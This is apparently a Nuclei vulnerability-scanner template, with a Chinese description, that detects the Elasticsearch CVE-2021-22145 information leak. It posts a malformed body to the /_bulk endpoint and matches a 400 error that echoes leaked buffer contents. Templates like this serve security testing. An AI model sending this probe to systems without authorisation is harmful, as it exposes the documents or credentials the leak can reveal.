id: CVE-2021-22145

info:
  name: Elasticsearch - 信息泄露(CVE-2021-22145)
  author: wintry
  severity: medium
  description: |
    ElasticSsarch 7.10.0至7.13.3易受信息泄露的影响.
    具有提交任意查询能力的用户可能会提交格式错误的查询,从而导致包含以前使用过的数据缓冲区部分的错误消息.
    此缓冲区可能包含敏感信息,例如Elasticsearch文档或身份验证细节,因此可能导致数据修改和/或执行未经授权的操作.
  tags: elasticsearch
  metadata:
    max-request: 1

http:
  - method: POST
    path:
      - '{{BaseURL}}/_bulk'
    headers:
      Content-Type: application/json
    body: |
      @

    matchers-condition: and
    matchers:

      - type: word
        words:
          - 'root_cause'
          - 'truncated'
          - 'reason'
        part: body
        condition: and

      - type: status
        status:
          - 400

# Enhanced by md on 2023/04/04
